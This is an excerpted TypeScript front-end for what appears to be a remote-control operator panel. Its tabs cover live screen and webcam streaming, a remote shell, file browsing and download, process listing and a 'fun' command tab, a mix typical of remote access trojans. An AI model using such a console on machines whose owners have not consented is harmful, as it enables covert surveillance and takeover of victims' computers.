...
import type { ClientDetailResponse, ControlTab } from "./types.js";
...
export function bindAdminControl(view: HTMLElement, detail: ClientDetailResponse, onBack: () => void): void {
  const c = detail.client;
  let ctrlTab: ControlTab = "screen";
  let shellHistory: { cmd: string; out: string }[] = (detail.commandHistory || []).map(h => ({ cmd: h.command, out: h.result }));
  let screenInterval: ReturnType<typeof setInterval> | null = null;
  let camInterval: ReturnType<typeof setInterval> | null = null;
  ...
  view.querySelectorAll<HTMLButtonElement>(".hc-control-nav").forEach(btn => {
    btn.addEventListener("click", () => {
      ctrlTab = btn.dataset["tab"] as ControlTab;
      view.querySelectorAll(".hc-control-nav").forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      view.querySelector<HTMLElement>("#ctrl-title")!.textContent = CONTROL_TABS.find(t => t.id === ctrlTab)?.label || "";
      renderContent();
    });
  });

  function renderContent(): void {
    const el = view.querySelector<HTMLElement>("#ctrl-content")!;

    if (ctrlTab === "screen") {
      el.innerHTML = `
        <div class="hc-viewer-toolbar">
          <button class="hc-toolbar-btn" id="screen-toggle">${screenStreaming ? "⏹ Stop" : "▶ Start"}</button>
          ...
          <button class="hc-toolbar-btn">⛶ Full</button>
      ...
      el.querySelector("#screen-fps")!.addEventListener("input", (e) => {
        screenFps = Number((e.target as HTMLInputElement).value);
        el.querySelector("#screen-fps-val")!.textContent = String(screenFps);
        if (screenStreaming && screenInterval) {
          clearInterval(screenInterval);
          screenInterval = setInterval(captureScreen, 1000 / screenFps);
        }
      });
      el.querySelector("#screen-quality")!.addEventListener("input", (e) => {
        screenQuality = Number((e.target as HTMLInputElement).value);
    ...
    if (ctrlTab === "camera") {
      el.innerHTML = `
        <div class="hc-viewer-toolbar">
          <button class="hc-toolbar-btn" id="cam-toggle">${camStreaming ? "⏹ Stop" : "▶ Start"}</button>
      ...
      el.querySelector("#cam-fps")!.addEventListener("input", (e) => {
        camFps = Number((e.target as HTMLInputElement).value);
        el.querySelector("#cam-fps-val")!.textContent = String(camFps);
        if (camStreaming && camInterval) {
          clearInterval(camInterval);
          camInterval = setInterval(captureCamera, 1000 / camFps);
        }
      });
      el.querySelector("#cam-quality")!.addEventListener("input", (e) => {
        camQuality = Number((e.target as HTMLInputElement).value);
      ...
      el.querySelector("#cam-snap")!.addEventListener("click", () => {
        if (!camStreaming) captureCamera();
      });
      return;
    }
    ...
    if (ctrlTab === "shell") {
      ...
      const input = el.querySelector<HTMLInputElement>("#shell-input")!;
      const run = async () => {
        const cmd = input.value.trim();
        if (!cmd) return;
        input.value = "";
        try {
          const res = await api.sendCommand(c.id, "shell", cmd);
          shellHistory.push({ cmd, out: res.result });
        } catch (e) {
          shellHistory.push({ cmd, out: `Error: ${e instanceof Error ? e.message : "Failed"}` });
        }
        renderContent();
    ...
    if (ctrlTab === "files") {
      el.innerHTML = `
        <div class="hc-card">
          ...
          <div class="hc-file-toolbar">
            ...
            <button class="hc-mini-btn" id="file-refresh">⟳</button>
          </div>
          ...
          <div class="hc-file-list" id="file-list">
            ${fileList.map((f: any) => `
              <div class="hc-file-row" data-name="${esc(f.name)}" data-type="${f.type || f.kind || "file"}">
                <span class="hc-file-icon">${(f.type === "folder" || f.kind === "folder") ? "📁" : "📄"}</span>
      ...
      async function browseDir(path: string) {
        filePath = path;
        try {
          const res = await api.sendCommand(c.id, "ls", `ls ${path}`);
          if (res.result?.startsWith?.("FILES:")) {
            fileList = JSON.parse(res.result.slice(6));
          }
        } catch {
      ...
      el.querySelector("#file-go")!.addEventListener("click", () => {
        browseDir((el.querySelector("#file-path-input") as HTMLInputElement).value);
      });
      el.querySelector("#file-refresh")!.addEventListener("click", () => browseDir(filePath));
      (el.querySelector("#file-path-input") as HTMLInputElement).addEventListener("keydown", (e) => {
        if (e.key === "Enter") browseDir((e.target as HTMLInputElement).value);
      });

      el.querySelectorAll<HTMLButtonElement>(".file-open-btn").forEach(btn => {
        btn.addEventListener("click", () => browseDir(`${filePath}\\${btn.dataset["name"]}`));
      });
      el.querySelectorAll<HTMLButtonElement>(".file-dl-btn").forEach(btn => {
        btn.addEventListener("click", () => api.sendCommand(c.id, "download", `download ${filePath}\\${btn.dataset["name"]}`));
      });
      el.querySelectorAll<HTMLElement>(".hc-file-row").forEach(row => {
        row.addEventListener("dblclick", () => {
          if (row.dataset["type"] === "folder") browseDir(`${filePath}\\${row.dataset["name"]}`);
        });
      });
      return;
    }
    ...
    if (ctrlTab === "processes") {
      ...
      el.querySelector("#proc-search")!.addEventListener("input", (e) => {
        ...
        el.querySelectorAll<HTMLTableRowElement>("#proc-tbody tr").forEach(row => {
    ...
    if (ctrlTab === "system") {
      el.innerHTML = `
        <div class="hc-two-col">
          ...
          <div class="hc-card">
            <h3 class="hc-section-title">Network & Security</h3>
    ...
    if (ctrlTab === "fun") {
      ...
      el.querySelectorAll<HTMLButtonElement>(".fun-cmd-btn").forEach(btn => {
  ...
  async function captureScreen() {
    try {
      ...
      if (res.result?.startsWith?.("SCREEN:")) {
        ...
        const info = view.querySelector<HTMLElement>("#screen-live-info");
  ...
  async function captureCamera() {
    try {
      ...
      if (res.result?.startsWith?.("CAMERA:")) {
        ...
        const info = view.querySelector<HTMLElement>("#cam-live-info");
        if (info) info.style.display = "flex";
      }
    } catch {}
  }
